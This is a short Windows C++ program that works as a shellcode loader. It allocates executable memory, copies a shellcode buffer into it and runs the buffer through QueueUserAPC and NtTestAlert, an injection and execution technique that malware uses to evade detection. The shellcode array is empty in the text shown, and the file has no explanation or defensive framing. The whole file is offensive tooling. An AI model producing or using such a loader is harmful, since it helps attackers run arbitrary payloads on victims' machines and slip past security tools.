#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

unsigned char shellcode[] = \

;

int main(int argc, char* argv[]) {
  SIZE_T shellcode_len = sizeof(shellcode);
  HMODULE hNtdll = GetModuleHandleA("ntdll");
  myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(hNtdll, "NtTestAlert"));

  LPVOID shellcode_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(GetCurrentProcess(), shellcode_mem, shellcode, shellcode_len, NULL);

  printf("shellcode_len=%d\n", shellcode_len);
  system("pause");

  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcode_mem;
  QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
  testAlert();

  return 0;
}
